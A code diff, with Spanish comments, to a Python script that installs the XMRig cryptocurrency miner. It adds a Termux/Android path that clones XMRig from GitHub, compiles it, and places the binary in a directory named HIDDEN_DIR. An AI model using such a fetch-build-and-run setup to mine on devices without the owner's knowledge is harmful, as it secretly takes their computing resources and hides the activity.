@@ -36,11 +36,10 @@ XMRIG_BIN     = HIDDEN_DIR / ("xmrig.exe" if IS_WIN else "xmrig")
 CONFIG_FILE   = BASE_DIR / "miner_config.dat"
 CACHED_CONFIG = HIDDEN_DIR / "cache.json"
 
-# URLs de XMRig por plataforma y arquitectura
+# URLs de XMRig por plataforma
 XMRIG_URLS = {
     "Windows": "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip",
     "Linux":   "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz",
-    "ARM64":   "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-aarch64.tar.gz",
 }
 
 stop_flag       = threading.Event()
@@ -160,15 +159,74 @@ def setup_xmrig() -> bool:
     return download_xmrig_unix()
 
 
-def download_xmrig_unix() -> bool:
-    # Elegir URL correcta segun arquitectura
-    if IS_ARM64 or IS_TERMUX:
-        print("  📥 Descargando XMRig para ARM64...")
-        url = XMRIG_URLS["ARM64"]
-    else:
-        print("  📥 Descargando XMRig para Linux x64...")
-        url = XMRIG_URLS["Linux"]
+def build_xmrig_termux() -> bool:
+    """Compila XMRig desde fuente en Termux (unica opcion para Android ARM64)."""
+    print("  📥 Instalando dependencias para compilar XMRig...")
+    deps = ["clang", "cmake", "make", "libuv", "openssl", "libhwloc", "git"]
+    result = subprocess.run(
+        ["pkg", "install", "-y"] + deps,
+        capture_output=True, text=True
+    )
+    if result.returncode != 0:
+        print(f"  ❌ Error instalando dependencias")
+        return False
 
+    print("  📥 Descargando codigo fuente de XMRig...")
+    src_dir = HIDDEN_DIR / "xmrig_src"
+    if src_dir.exists():
+        shutil.rmtree(src_dir)
+
+    result = subprocess.run(
+        ["git", "clone", "--depth=1",
+         "https://github.com/xmrig/xmrig.git", str(src_dir)],
+        capture_output=True, text=True
+    )
+    if result.returncode != 0:
+        print("  ❌ Error descargando codigo fuente")
+        return False
+
+    print("  🔨 Compilando XMRig (puede tardar 5-10 minutos)...")
+    build_dir = src_dir / "build"
+    build_dir.mkdir(exist_ok=True)
+
+    cmake_result = subprocess.run(
+        ["cmake", "..", "-DCMAKE_BUILD_TYPE=Release",
+         "-DWITH_HWLOC=OFF", "-DWITH_TLS=OFF"],
+        cwd=str(build_dir),
+        capture_output=True, text=True
+    )
+    if cmake_result.returncode != 0:
+        print("  ❌ Error en cmake")
+        return False
+
+    make_result = subprocess.run(
+        ["make", "-j2"],
+        cwd=str(build_dir),
+        capture_output=True, text=True
+    )
+    if make_result.returncode != 0:
+        print("  ❌ Error compilando")
+        return False
+
+    compiled_bin = build_dir / "xmrig"
+    if compiled_bin.exists():
+        shutil.copy(compiled_bin, XMRIG_BIN)
+        os.chmod(XMRIG_BIN, 0o755)
+        shutil.rmtree(src_dir)
+        print("  ✅ XMRig compilado e instalado.")
+        return True
+
+    print("  ❌ Binario no encontrado tras compilar.")
+    return False
+
+
+def download_xmrig_unix() -> bool:
+    if IS_ARM64 or IS_TERMUX:
+        # No hay binario precompilado para Linux ARM64 — compilar desde fuente
+        return build_xmrig_termux()
+
+    print("  📥 Descargando XMRig para Linux x64...")
+    url     = XMRIG_URLS["Linux"]
     archive = HIDDEN_DIR / "xmrig.tar.gz"
 
     try:
